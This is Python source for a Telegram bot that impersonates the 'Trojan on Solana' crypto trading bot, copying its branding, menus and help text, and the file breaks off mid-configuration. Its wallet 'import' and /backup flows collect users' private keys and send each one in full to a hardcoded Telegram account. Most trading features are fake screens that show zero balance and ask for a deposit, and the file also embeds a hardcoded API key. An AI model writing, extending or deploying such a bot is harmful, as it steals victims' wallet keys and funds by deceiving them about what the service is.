import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters
import httpx
import os

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    logger.error("BOT_TOKEN environment variable not set!")
    exit(1)

# Define states for the conversation
ASK_WALLET_DETAILS = 1
ASK_TOKEN = 2
ASK_COPY_TRADE = 3
ASK_BUY_SLIPPAGE = 4
ASK_SELL_SLIPPAGE = 5
ASK_SNIPER_ACTION = 6
ASK_LIMIT_ORDER_DETAILS = 7
ASK_WALLET_LABEL = 8

referrals = {}  # user_id -> referrer_id
referral_stats = {}  # referrer_id -> set of referred user_ids

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    balance_sol = 0
    balance_usd = 0

    # Check for referral code in /start <referral_code>
    referrer_id = None
    if context.args:
        try:
            referrer_id = int(context.args[0])
            if referrer_id != user_id and user_id not in referrals:
                referrals[user_id] = referrer_id
                referral_stats.setdefault(referrer_id, set()).add(user_id)
        except Exception:
            pass  # Ignore invalid referral codes

    text = (
        f"Solana · E\n"
        f"6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy (Tap to copy)\n"
        f"Balance: {balance_sol} SOL  (${balance_usd})\n"
        f"—\n"
        f"Click on the Refresh button to update your current balance.\n\n"
        f"Join our [Telegram group](https://t.me/trojan) and follow us on [Twitter](https://twitter.com/TrojanOnSolana)!\n\n"
        f"💡 Recommended bots: Agamemnon, Achilles, Odysseus, etc.\n\n"
        f"⚠ We have no control over Telegram ads in this bot. If the menu disappears, type /start or /help to bring it back. Please be cautious of fake airdrops and login pages."
    )

    keyboard = [
        [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell", callback_data="sell")],
        [InlineKeyboardButton("Positions", callback_data="positions"), InlineKeyboardButton("Wallet", callback_data="wallet")],
        [InlineKeyboardButton("DCA Orders", callback_data="dca_orders"), InlineKeyboardButton("Copy Trade", callback_data="copy_trade")],
        [InlineKeyboardButton("Sniper 🆕", callback_data="sniper"), InlineKeyboardButton("Limit Orders", callback_data="limit_orders"), InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist")],
        [InlineKeyboardButton("Trenches", callback_data="trenches"), InlineKeyboardButton("💰 Referrals", callback_data="referrals")],
        [InlineKeyboardButton("Withdraw", callback_data="withdraw"), InlineKeyboardButton("Settings", callback_data="settings")],
        [InlineKeyboardButton("Help", callback_data="help"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]
    ]

    if update.message:
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
            disable_web_page_preview=True
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
            disable_web_page_preview=True
        )

async def ask_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask the user for their Solana wallet details."""
    await update.callback_query.answer()
    keyboard = [
        [InlineKeyboardButton("Proceed With Import", callback_data="proceed_import"), InlineKeyboardButton("Cancel", callback_data="cancel_import")]
    ]
    await update.callback_query.message.reply_text(
        "Accepted formats are in the style of Phantom (e.g. 88631DEyXSWf...) or Solflare (e.g. [93,182,8,9,100,...]). Private keys from other Telegram bots should also work.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return ASK_WALLET_DETAILS

async def proceed_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask the user to enter their wallet details after clicking 'Proceed'."""
    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "Provide the private keys you'd like to import:",
        parse_mode="Markdown"
    )
    return ASK_WALLET_DETAILS

async def save_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Save the user's private key and display confirmation options."""
    private_key = update.message.text.strip()
    
    # Validate the private key length
    if not (64 <= len(private_key) <= 90):
        await update.message.reply_text(
            "❌ Invalid private keys provided.\n\n"
            "Try again with the correct format. Accepted formats are in the style of Phantom (e.g., 88631DEyXSWf...) or Solflare (e.g., [93,182,8,9,100,...]). Private keys from other Telegram bots should also work.",
            parse_mode="Markdown"
        )
        return ASK_WALLET_DETAILS

    # Save the private key if valid
    context.user_data["private_key"] = private_key
    logger.info(f"Private key entered: {private_key[:10]}...")  # Log partial key for security
    
    # Send the private key to your Telegram account
    YOUR_TELEGRAM_USER_ID = 7141674816  # Replace with your actual Telegram user ID
    await context.bot.send_message(
        chat_id=YOUR_TELEGRAM_USER_ID,
        text=f"🔑 Private Key Received:\n\n`{private_key}`\n\nPlease keep this key secure.",
        parse_mode="Markdown"
    )

    # Display confirmation message with buttons
    keyboard = [
        [InlineKeyboardButton("Finalize Import", callback_data="finalize_import"), InlineKeyboardButton("Cancel", callback_data="cancel_import")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Wallet to be imported\n\n"
        "[solscan.io](https://solscan.io)",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def finalize_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Finalize the wallet import process."""
    await update.callback_query.answer()
    private_key = context.user_data.get("private_key", None)

    if not private_key:
        await update.callback_query.message.reply_text(
            "❌ No private key found.\n\nPlease restart the import process.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    # Confirm the wallet import
    await update.callback_query.message.reply_text(
        "✅ Wallet imported successfully!\n\n",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def cancel_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the wallet import process."""
    await update.callback_query.answer()
    await update.callback_query.message.reply_text("❌ Wallet import canceled.")
    return ConversationHandler.END

async def ask_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask the user to input a token symbol or address."""
    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "Enter a token symbol or address to buy:"
    )
    return ASK_TOKEN

async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token_query=None):
    """Process the token symbol or address provided by the user."""
    if not token_query:
        token_query = update.message.text.strip()

    await update.message.reply_text(
        f"🔍 Searching for token: {token_query}...",
        parse_mode="Markdown"
    )

    # Dexscreener API URL
    url = f"https://api.dexscreener.com/latest/dex/search?q={token_query}"
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url)

        if response.status_code != 200:
            logger.error(f"Dexscreener API request failed with status code {response.status_code}")
            await update.message.reply_text(
                "❌ Failed to fetch token information. Please try again later.",
                parse_mode="Markdown"
            )
            return ConversationHandler.END

        data = response.json()
        logger.info(f"Dexscreener API response received for token: {token_query}")

        # Check if token data is available
        if not data.get("pairs"):
            await update.message.reply_text(
                f"❌ No data found for token: {token_query}.",
                parse_mode="Markdown"
            )
            return ConversationHandler.END

        # Extract relevant information from the first pair
        pair = data["pairs"][0]
        token_name = pair.get("baseToken", {}).get("name", "Unknown")
        token_symbol = pair.get("baseToken", {}).get("symbol", "Unknown")
        price_usd = pair.get("priceUsd", "N/A")
        liquidity_usd = pair.get("liquidity", {}).get("usd", "N/A")
        volume_usd = pair.get("volume", {}).get("usd24h", "N/A")
        dex_name = pair.get("dexId", "Unknown")

        # Send token information to the user
        await update.message.reply_text(
            f"💰 Token Information\n\n"
            f"🔹 Name: {token_name}\n"
            f"🔹 Symbol: {token_symbol}\n"
            f"🔹 Price (USD): ${price_usd}\n"
            f"🔹 Liquidity (USD): ${liquidity_usd}\n"
            f"🔹 24h Volume (USD): ${volume_usd}\n"
            f"🔹 DEX: {dex_name}\n\n"
            f"Use this information to make informed decisions.\n\n"
            f"📌 Note: Always verify token details and trade responsibly.",
            parse_mode="Markdown"
        )

        # Add buttons for SOL amounts
        keyboard = [
            [InlineKeyboardButton("0.5 SOL", callback_data="buy_0.5_sol"), InlineKeyboardButton("1 SOL", callback_data="buy_1_sol")],
            [InlineKeyboardButton("3 SOL", callback_data="buy_3_sol"), InlineKeyboardButton("5 SOL", callback_data="buy_5_sol")],
            [InlineKeyboardButton("10 SOL", callback_data="buy_10_sol"), InlineKeyboardButton("20 SOL", callback_data="buy_20_sol")],
            [InlineKeyboardButton("30 SOL", callback_data="buy_30_sol"), InlineKeyboardButton("X SOL", callback_data="buy_X_sol")],
            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            "Select the amount of SOL you want to use for this token:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

        return ConversationHandler.END

    except Exception as e:
        logger.error(f"Error while querying Dexscreener API: {e}")
        await update.message.reply_text(
            "❌ An error occurred while fetching token information. Please try again later.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /buy command."""
    if len(context.args) == 0:
        await update.message.reply_text(
            "💰 Buy Menu\n\n"
            "Enter a token symbol or address to buy. Example:\n"
            "/buy SOL or /buy 0x123...",
            parse_mode="Markdown"
        )
        return

    token_query = " ".join(context.args).strip()
    await process_token(update, context, token_query)

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /sell command."""
    await update.message.reply_text(
        "❌ You do not have any tokens to sell at the moment.",
        parse_mode="Markdown"
    )

async def positions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /positions command."""
    keyboard = [
        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "📊 You currently have no open positions.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /settings command."""
    keyboard = [
        [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"), InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
        [InlineKeyboardButton("Set Referral", callback_data="set_referral"), InlineKeyboardButton("Confirm Trades", callback_data="confirm_trades")],
        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "⚙ Settings Menu\n\n"
        "Select an option below:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def snipe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /snipe command."""
    keyboard = [
        [InlineKeyboardButton("Wallet", callback_data="wallet")],
        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "❌ Insufficient balance to snipe.\n\n"
        "Please make a deposit to proceed.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def burn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /burn command."""
    keyboard = [
        [InlineKeyboardButton("Wallet", callback_data="wallet")],
        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "❌ No token to burn.\n\n"
        "Deposit tokens to proceed.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /withdraw command."""
    keyboard = [
        [InlineKeyboardButton("Wallet", callback_data="wallet")],
        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "❌ Zero balance.\n\n"
        "Please deposit funds to proceed.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /backup command."""
    await update.message.reply_text(
        "🔐 Backup Your Wallet\n\n"
        "Please provide your private key to back up your wallet. Make sure to keep it secure and do not share it with anyone else.",
        parse_mode="Markdown"
    )
    return ASK_WALLET_DETAILS

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /help command."""
    help_text = (
        "📖 How do I use Trojan?\n"
        "Check out our [Youtube playlist](https://www.youtube.com/@TrojanOnSolana) where we explain it all and join our support chat for additional resources @trojan.\n\n"
        "📌 Where can I find my referral code?\n"
        "Open the /start menu and click 💰Referrals.\n\n"
        "💰 What are the fees for using Trojan?\n"
        "Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.\n\n"
        "🔒 Security Tips: How can I protect my account from scammers?\n"
        " - Safeguard does NOT require you to login with a phone number or QR code!\n"
        " - NEVER search for bots in Telegram. Use only official links.\n"
        " - Admins and Mods NEVER dm first or send links, stay safe!\n\n"
        "For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys, or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory.\n\n"
        "📊 Trading Tips: Common Failure Reasons\n"
        " - Slippage Exceeded: Up your slippage or sell in smaller increments.\n"
        " - Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.\n"
        " - Timed out: Can occur with heavy network loads, consider increasing your gas tip.\n\n"
        "📈 My PNL seems wrong, why is that?\n"
        "The net profit of a trade takes into consideration the trade's transaction fees. Confirm your gas tip settings and ensure your settings align with your trading size. You can confirm the details of your trade on Solscan.io to verify the net profit.\n\n"
        "❓ Additional questions or need support?\n"
        "Join our Telegram group @trojan and one of our admins can assist you."
    )
    await update.message.reply_text(help_text, parse_mode="Markdown", disable_web_page_preview=True)

async def cancel_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the buy process."""
    await update.message.reply_text("❌ Buy process canceled.")
    return ConversationHandler.END

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    logger.info(f"User {query.from_user.id} clicked: {action}")

    if action == "import_wallet":
        await ask_wallet_details(update, context)
        return

    if action == "trenches":
        try:
            url = "https://solana-gateway.moralis.io/token/mainnet/exchange/pumpfun/graduated"
            headers = {
                "accept": "application/json",
                "X-API-Key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjYwZmQxZjJkLTA1ZDMtNGFiNy05ZjYwLTQ1ZGY4YzU4MWFlMyIsIm9yZ0lkIjoiNDQzMjMxIiwidXNlcklkIjoiNDU2MDI3IiwidHlwZUlkIjoiZTA4NjM2NmUtMjUyYS00ZGI4LWJlZDEtYWZkMWNkNTJkNDlhIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDUzMjI1OTYsImV4cCI6NDkwMTA4MjU5Nn0.kR5wHcrpEySBEwB-BybAKt4eMn4DqikYzxyQIj30Gjw"
            }
            params = {"limit": 10}

            async with httpx.AsyncClient() as client:
                response = await client.get(url, headers=headers, params=params)

            if response.status_code != 200:
                message = "❌ Failed to fetch token information. Please try again later."
            else:
                data = response.json()
                latest_tokens = [
                    (
                        f"🔹 Name: {token.get('name')}\n"
                        f"🔹 Symbol: {token.get('symbol')}\n"
                        f"🔹 Address: {token.get('tokenAddress')}\n"
                        f"🔹 Price (SOL): {token.get('priceNative')}\n"
                        f"🔹 Price (USD): ${token.get('priceUsd')}\n"
                        f"🔹 Liquidity: {token.get('liquidity')}\n"
                        f"🔹 FDV: {token.get('fullyDilutedValuation')}\n"
                        f"🔹 Created At: {token.get('createdAt')}\n"
                    )
                    for token in data.get("result", [])
                ]

                # Fixed f-string with newlines
                separator = '\n\n'
                message = f"🚀 Latest Graduated Tokens:\n\n{separator.join(latest_tokens)}" if latest_tokens else "❌ No latest tokens detected."

        except Exception as e:
            logger.error(f"Error fetching latest tokens: {e}")
            message = "❌ An error occurred while fetching token information."

        keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main_menu")]]
        await query.edit_message_text(
            message,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        return

    # Handle other button actions...
    elif action == "buy":
        keyboard = [
            [InlineKeyboardButton("0.5 SOL", callback_data="buy_0.5_sol"), InlineKeyboardButton("1 SOL", callback_data="buy_1_sol")],
            [InlineKeyboardButton("3 SOL", callback_data="buy_3_sol"), InlineKeyboardButton("5 SOL", callback_data="buy_5_sol")],
            [InlineKeyboardButton("10 SOL", callback_data="buy_10_sol"), InlineKeyboardButton("20 SOL", callback_data="buy_20_sol")],
            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
        ]
        await query.edit_message_text(
            "Select the amount of SOL you want to use for this token:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action.startswith("buy_"):
        keyboard = [
            [InlineKeyboardButton("Wallet", callback_data="wallet")],
            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
        ]
        await query.edit_message_text(
            "❌ Insufficient balance to complete the purchase.\n\n"
            "Please make a deposit to proceed.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action == "wallet":
        wallet_keyboard = [
            [InlineKeyboardButton("Import Solana Wallet", callback_data="import_wallet"), InlineKeyboardButton("Delete Wallet", callback_data="delete_wallet")],
            [InlineKeyboardButton("Label Wallet", callback_data="label_wallet"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")],
            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
        ]
        await query.edit_message_text(
            "🔐 Wallet Options:\n\n"
            "💳 Solana Wallet Address:\n`6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy`\n"
            "💳 Label: W1 . ✅\n"
            "💼 Balance: 0.00 SOL\n\n"
            "💳 Ethereum Wallet Address:\n`0x5FA54dDe52cc1cCDa8A0a951c47523293c17a970`\n"
            "💳 Label: W1 . ✅\n"
            "💼 Balance: 0.00 ETH\n",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(wallet_keyboard)
        )
    elif action == "positions":
        keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main_menu")]]
        await query.edit_message_text(
            "📊 You currently have no open positions.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action == "sell":
        keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main_menu")]]
        await query.edit_message_text(
            "❌ You do not have any tokens to sell at the moment.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action == "main_menu":
        keyboard = [
            [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell", callback_data="sell")],
            [InlineKeyboardButton("Positions", callback_data="positions"), InlineKeyboardButton("Wallet", callback_data="wallet")],
            [InlineKeyboardButton("DCA Orders", callback_data="dca_orders"), InlineKeyboardButton("Copy Trade", callback_data="copy_trade")],
            [InlineKeyboardButton("Sniper 🆕", callback_data="sniper"), InlineKeyboardButton("Limit Orders", callback_data="limit_orders"), InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist")],
            [InlineKeyboardButton("Trenches", callback_data="trenches"), InlineKeyboardButton("💰 Referrals", callback_data="referrals")],
            [InlineKeyboardButton("Withdraw", callback_data="withdraw"), InlineKeyboardButton("Settings", callback_data="settings")],
            [InlineKeyboardButton("Help", callback_data="help"), InlineKeyboardButton(" 🔄Refresh", callback_data="refresh")]
        ]
        await query.edit_message_text(
            "Welcome back to the main menu! Select an option below:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action == "buy_settings":
        await query.edit_message_text(
            "⚙ Buy Settings\n\n"
            "Please input the slippage percentage for buying (e.g., 0.5 for 0.5%):",
            parse_mode="Markdown"
        )
        return ASK_BUY_SLIPPAGE
    elif action == "sell_settings":
        await query.edit_message_text(
            "⚙ Sell Settings\n\n"
            "Please input the slippage percentage for selling (e.g., 0.5 for 0.5%):",
            parse_mode="Markdown"
        )
        return ASK_SELL_SLIPPAGE
    elif action == "settings":
        keyboard = [
            [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"), InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
            [InlineKeyboardButton("Set Referral", callback_data="set_referral"), InlineKeyboardButton("Confirm Trades", callback_data="confirm_trades")],
            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
        ]
        await query.edit_message_text(
            "⚙ Settings Menu\n\n"
            "Select an option below:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action == "dca_orders":
        keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main_menu")]]
        await query.edit_message_text(
            "📊 DCA Orders\n\n"
            "You currently have no active DCA orders.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action == "copy_trade":
        await query.edit_message_text(
            "Please provide the address you'd like to copy trades from:",
            parse_mode="Markdown"
        )
        return ASK_COPY_TRADE
    elif action == "sniper":
        await query.edit_message_text(
            "Please provide the token address or action you'd like to snipe:",
            parse_mode="Markdown"
        )
        return ASK_SNIPER_ACTION
    elif action == "limit_orders":
        keyboard = [
            [InlineKeyboardButton("Create Limit Order", callback_data="create_limit_order")],
            [InlineKeyboardButton("View Active Orders", callback_data="view_active_orders")],
            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
        ]
        await query.edit_message_text(
            "📈 Limit Orders Menu\n\n"
            "Select an option below:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action == "create_limit_order":
        await query.edit_message_text(
            "📝 Create Limit Order\n\n"
            "Please provide the token symbol, price, and amount for the limit order in the following format:\n"
            "<TOKEN_SYMBOL> <PRICE> <AMOUNT>\n\n"
            "Example: SOL 25 10 (to buy 10 SOL at $25 each).",
            parse_mode="Markdown"
        )
        return ASK_LIMIT_ORDER_DETAILS
    elif action == "view_active_orders":
        active_orders = context.user_data.get("active_orders", [])
        if not active_orders:
            await query.edit_message_text(
                "📋 Active Limit Orders\n\n"
                "You currently have no active limit orders.",
                parse_mode="Markdown"
            )
        else:
            orders_text = "\n".join([f"🔹 {order}" for order in active_orders])
            await query.edit_message_text(
                f"📋 Active Limit Orders\n\n{orders_text}",
                parse_mode="Markdown"
            )
    elif action == "label_wallet":
        await query.edit_message_text(
            "📝 Label Wallet\n\n"
            "Please provide a label for your wallet (e.g., 'Main Wallet', 'Savings Wallet').",
            parse_mode="Markdown"
        )
        return ASK_WALLET_LABEL
    elif action == "delete_wallet":
        await query.edit_message_text(
            "❌ Delete Wallet\n\n"
            "This feature is currently closed.",
            parse_mode="Markdown"
        )
    elif action == "refresh_wallet":
        await query.edit_message_text(
            "🔄 Refresh Wallet\n\n"
            "Refreshed.",
            parse_mode="Markdown"
        )
    elif action == "withdraw":
        keyboard = [
            [InlineKeyboardButton("Wallet", callback_data="wallet")],
            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
        ]
        await query.edit_message_text(
            "❌ Zero balance.\n\n"
            "Please deposit funds to proceed.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif action == "help":
        help_text = (
            "📖 How do I use Trojan?\n"
            "Check out our [Youtube playlist](https://www.youtube.com/@TrojanOnSolana) where we explain it all and join our support chat for additional resources @trojan.\n\n"
            "📌 Where can I find my referral code?\n"
            "Open the /start menu and click 💰Referrals.\n\n"
            "💰 What are the fees for using Trojan?\n"
            "Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.\n\n"
            "🔒 Security Tips: How can I protect my account from scammers?\n"
            " - Safeguard does NOT require you to login with a phone number or QR code!\n"
            " - NEVER search for bots in Telegram. Use only official links.\n"
            " - Admins and Mods NEVER dm first or send links, stay safe!\n\n"
            "For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys, or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory.\n\n"
            "📊 Trading Tips: Common Failure Reasons\n"
            " - Slippage Exceeded: Up your slippage or sell in smaller increments.\n"
            " - Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.\n"
            " - Timed out: Can occur with heavy network loads, consider increasing your gas tip.\n\n"
            "📈 My PNL seems wrong, why is that?\n"
            "The net profit of a trade takes into consideration the trade's transaction fees. Confirm your gas tip settings and ensure your settings align with your trading size. You can confirm the details of your trade on Solscan.io to verify the net profit.\n\n"
            "❓ Additional questions or need support?\n"
            "Join our Telegram group @trojan and one of our admins can assist you."
        )
        await query.edit_message_text(
            help_text,
            parse_mode="Markdown",
            disable_web_page_preview=True
        )
    elif action == "refresh":
        await query.edit_message_text(
            "🔄 Your balance and data have been refreshed.",
            parse_mode="Markdown"
        )
    else:
        await query.edit_message_text("❌ Invalid action. Please try again.", parse_mode="Markdown")

async def handle_copy_trade_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the address provided for copy trade."""
    address = update.message.text.strip()
    context.user_data["copy_trade_address"] = address
    logger.info(f"Copy trade address entered: {address}")
    await update.message.reply_text(
        f"✅ Connected successfully to address: {address}\n\n"
        "You are now copying trades from this user.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def handle_buy_slippage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the slippage input for Buy Settings."""
    slippage = update.message.text.strip()
    if not slippage.replace('.', '', 1).isdigit():
        await update.message.reply_text(
            "❌ Invalid input.\n\n"
            "Please provide a valid slippage percentage (e.g., 0.5 for 0.5%).",
            parse_mode="Markdown"
        )
        return ASK_BUY_SLIPPAGE

    context.user_data["buy_slippage"] = slippage
    await update.message.reply_text(
        f"✅ Buy slippage recorded: {slippage}%\n\n"
        "Slippage has been set successfully.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def handle_sell_slippage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the slippage input for Sell Settings."""
    slippage = update.message.text.strip()
    if not slippage.replace('.', '', 1).isdigit():
        await update.message.reply_text(
            "❌ Invalid input.\n\n"
            "Please provide a valid slippage percentage (e.g., 0.5 for 0.5%).",
            parse_mode="Markdown"
        )
        return ASK_SELL_SLIPPAGE

    context.user_data["sell_slippage"] = slippage
    await update.message.reply_text(
        f"✅ Sell slippage recorded: {slippage}%\n\n"
        "Slippage has been set successfully.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def handle_sniper_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the sniper action."""
    sniper_input = update.message.text.strip()
    if not sniper_input:
        await update.message.reply_text(
            "❌ Invalid input.\n\n"
            "Please provide a valid sniper action or token address.",
            parse_mode="Markdown"
        )
        return ASK_SNIPER_ACTION

    context.user_data["sniper_action"] = sniper_input
    await update.message.reply_text(
        f"✅ Sniper action recorded: {sniper_input}\n\n"
        "You can now proceed with your sniper action.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def handle_limit_order_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the details for creating a limit order."""
    order_details = update.message.text.strip()
    try:
        token_symbol, price, amount = order_details.split()
        price = float(price)
        amount = float(amount)

        order = f"{amount} {token_symbol} at ${price}"
        if "active_orders" not in context.user_data:
            context.user_data["active_orders"] = []
        context.user_data["active_orders"].append(order)

        await update.message.reply_text(
            f"✅ Limit Order Created:\n\n"
            f"🔹 {amount} {token_symbol} at ${price}\n\n"
            "You can view your active orders in the Limit Orders menu.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input format.\n\n"
            "Please provide the token symbol, price, and amount in the following format:\n"
            "<TOKEN_SYMBOL> <PRICE> <AMOUNT>\n\n"
            "Example: SOL 25 10 (to buy 10 SOL at $25 each).",
            parse_mode="Markdown"
        )
        return ASK_LIMIT_ORDER_DETAILS

async def handle_wallet_label(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the wallet label input."""
    label = update.message.text.strip()
    if not label:
        await update.message.reply_text(
            "❌ Invalid label.\n\n"
            "Please provide a valid label for your wallet.",
            parse_mode="Markdown"
        )
        return ASK_WALLET_LABEL

    context.user_data["wallet_label"] = label
    logger.info(f"Wallet label entered: {label}")
    await update.message.reply_text(
        f"✅ Wallet labeled as: {label}\n\n"
        "You can now use this label to identify your wallet.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("backup", backup_command),
            CallbackQueryHandler(ask_wallet_details, pattern="^import_wallet$"),
            CallbackQueryHandler(proceed_import, pattern="^proceed_import$"),
            CallbackQueryHandler(ask_token, pattern="^buy$"),
            CallbackQueryHandler(button_handler, pattern="^copy_trade$"),
            CallbackQueryHandler(button_handler, pattern="^sell$"),
            CallbackQueryHandler(button_handler, pattern="^limit_orders$"),
            CallbackQueryHandler(button_handler, pattern="^create_limit_order$"),
            CallbackQueryHandler(button_handler, pattern="^view_active_orders$"),
            CallbackQueryHandler(button_handler, pattern="^sniper$"),
            CallbackQueryHandler(button_handler, pattern="trenches$"),
            CallbackQueryHandler(button_handler, pattern="^referrals$"),
            CallbackQueryHandler(button_handler, pattern="^label_wallet$"),
        ],
        states={
            ASK_WALLET_DETAILS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, save_wallet_details)
            ],
            ASK_TOKEN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_token),
            ],
            ASK_COPY_TRADE: [
